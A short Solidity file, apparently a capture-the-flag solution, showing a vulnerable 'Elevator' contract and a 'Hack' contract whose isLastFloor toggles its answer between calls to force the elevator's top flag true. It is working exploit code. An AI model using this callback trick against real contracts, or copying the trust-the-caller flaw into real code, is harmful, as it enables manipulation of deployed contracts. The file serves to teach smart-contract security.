// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


// goal to make top true

contract Hack{
    Elevator public target;
    bool public last_floor = true;

    constructor (Elevator _target){
        target = _target;
        
    }
    function pwn () external {
        target.goTo(121);
    }
    function isLastFloor(uint floor) external returns (bool){
        last_floor = !last_floor;
        return last_floor;
    }


}

// so isLastFloor should return false on first call
// and true in the second call

